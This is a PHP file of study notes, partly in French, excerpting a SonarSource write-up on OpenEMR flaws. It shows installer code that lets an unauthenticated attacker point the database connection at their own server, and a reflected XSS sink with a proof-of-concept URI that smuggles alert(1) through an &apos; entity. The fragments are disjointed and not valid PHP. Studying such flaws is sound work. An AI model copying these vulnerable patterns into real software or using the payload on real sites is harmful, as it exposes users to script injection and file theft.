<?php
// quelques vulns php from: https://www.sonarsource.com/blog/openemr-remote-code-execution-in-your-healthcare-system/

// Unauthenticated Arbitrary File Read
// ====================================
// ...
$state = isset($_POST["state"]) ? ($_POST["state"]) : '';
$installer = new Installer($_REQUEST);
// ...
if ($state == 7) {
// ...
$installer->displayNewThemeDiv();

/*
The displayNewThemeDiv method invokes the getCurrentTheme method. During this call, 
a MySQL query is executed, which reads the current theme from the database. 
Since no database connection is established yet, 
a new one is created with the attacker-controlled properties set via the Installer constructor:
*/

<?php
// ...
class Installer
{
 public function __construct($cgi_variables)
 {
   $this->server = $cgi_variables['server'];
   $this->port = $cgi_variables['port'];
   $this->login = $cgi_variables['login'];
   $this->pass = $cgi_variables['pass'];
   $this->dbname = $cgi_variables['dbname'];
   // ...
 }
 // ...

 private function connect_to_database($server, $user, $password, $port, $dbname = '')
 {
   $ok = mysqli_real_connect($mysqli, $server, $user, $password, $dbname,   $port);
   // ...
 }

 public function user_database_connection()
 {
   $this->dbh = $this->connect_to_database($this->server, $this->login, $this->pass, $this->port, $this->dbname);
   // ...
 }
 // ...

 public function getCurrentTheme()
 {
   $current_theme =  $this->execute_sql("SELECT gl_value FROM globals WHERE gl_name LIKE '%css_header%'");
   // ...
 }

 /*
 To conclude, an unauthenticated attacker can perform a database query on their own server. But how does that lead to an arbitrary file read?
 */

 // XSS
 // ===
 
 /*
 the HTML is rendered first, followed by the JavaScript context. As a result, HTML entities can be used within an event handler since the browser decodes them. An &apos; thus becomes a single quote. Note that the two characters needed to represent an HTML entity: & and ; are not URL-encoded by the browser. 
 */

<a onclick="dopopup('<?php echo $_SERVER['REQUEST_URI'] . '&display=fullscreen&encounter=' . $encounter; ?>');"
href="JavaScript:void(0);"></a>

// Request URI: index.php?a=1&apos;);alert(1);//
// Réponse HTTP <a onlick=”dopopup(‘/index.php?a=1&apos;);alert(1);// ’)”>
// Dans le navigateur: <a onlick=”dopopup(‘/index.php?a=1’);alert(1);// ’)”>

